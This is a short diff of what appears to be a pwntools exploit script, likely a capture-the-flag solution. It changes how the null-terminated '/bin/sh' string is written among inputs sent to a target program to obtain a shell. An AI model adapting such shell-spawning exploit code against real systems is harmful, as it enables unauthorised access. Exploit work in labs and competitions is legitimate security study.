@@ -177,7 +177,7 @@ if __name__ == "__main__":
 
     send("g")
     send("0x8")
-    send("/bin/sh\0")
+    send("/bin/sh\x00")
     send("R")
 
     r.clean()
